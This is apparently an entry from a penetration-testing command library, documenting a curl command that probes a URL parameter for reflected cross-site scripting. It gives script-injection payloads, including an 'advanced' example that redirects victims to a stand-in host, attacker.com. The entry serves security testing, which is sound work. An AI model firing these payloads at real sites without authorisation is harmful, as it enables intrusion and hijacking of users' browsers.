---
data: 'curl "[target-url]?param=<script>payload</script>"'
tags:
  - xss
  - testing
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 1cc6d4e6-7c65-43c1-bf1c-1ecc4196b974
created_at: '2025-12-11T06:10:22.360Z'
updated_at: '2025-12-11T06:10:22.360Z'
verified: false
validated: true
submitted: true
---
# curl-test-xss-url

## Command

```bash
curl "[target-url]?param=<script>payload</script>"
```

## Description

This command uses curl to test a URL for reflected XSS by injecting a script payload into a parameter and checking if it reflects in the response.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `[target-url]` | The base URL of the vulnerable endpoint | Yes |
| `?param=` | The vulnerable query parameter and payload | Yes |

## Examples

### Basic Usage

```bash
curl "https://example.com/login?state=<script>alert(1)</script>"
```

### Advanced Usage

```bash
curl "https://example.com/login?state=<script>document.location='https://attacker.com'</script>" -v
```

## Expected Output

The response HTML should contain the injected script tag unsanitized, indicating a vulnerability.

## Related

- [[procedures/Craft-Malicious-XSS-URL]]
